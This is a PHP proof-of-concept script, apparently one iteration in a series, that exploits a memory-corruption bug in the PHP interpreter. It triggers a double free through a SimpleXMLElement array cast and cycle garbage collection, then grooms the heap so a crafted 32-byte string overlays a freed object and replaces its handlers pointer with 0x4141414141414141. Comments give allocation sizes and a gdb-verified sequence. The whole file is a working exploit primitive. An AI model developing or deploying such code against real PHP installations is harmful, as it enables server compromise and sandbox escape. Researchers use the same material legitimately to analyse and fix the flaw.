<?php
// P21 — p20 with the template at 32 bytes so substr(0,31) is a REAL copy
// (emalloc(24+31+1=56) exactly). Sequence verified by gdb alloc trace:
//   [double efree of props ht] -> emalloc56 #1 (new V) -> emalloc56 #2 (new V)
//   -> efree (unset $a) -> emalloc56 #3 (substr) == the string overlay.
class V { public $p; }
$tpl = "\x41\x41\x41\x41\x41\x41\x41\x41"     // 8  -> handlers  @+0x18
     . "\x00\x00\x00\x00\x00\x00\x00\x00"     // 8  -> properties @+0x20
     . "\x41\x41\x41\x41\x41\x41\x41\x41"     // 8  -> slot val   @+0x28
     . "\x00\x00\x00\x00\x00\x00\x00\x00";    // 8  -> 32 total; content[24..30] slot type

$xml = new SimpleXMLElement('<root a="1"><b>2</b><c>3</c></root>');
$x = (array)$xml;
$w = new stdClass(); $w->x = $xml; $w->self = $w;
unset($xml, $x, $w);
gc_collect_cycles();

$a = new V();
$b = new V();
unset($a);

$s = substr($tpl, 0, 31);            // REAL 56B copy, overlays the shared object
$r = $b->q;                          // read_property via handlers=0x4141414141414141
echo "no crash (miss)\n";
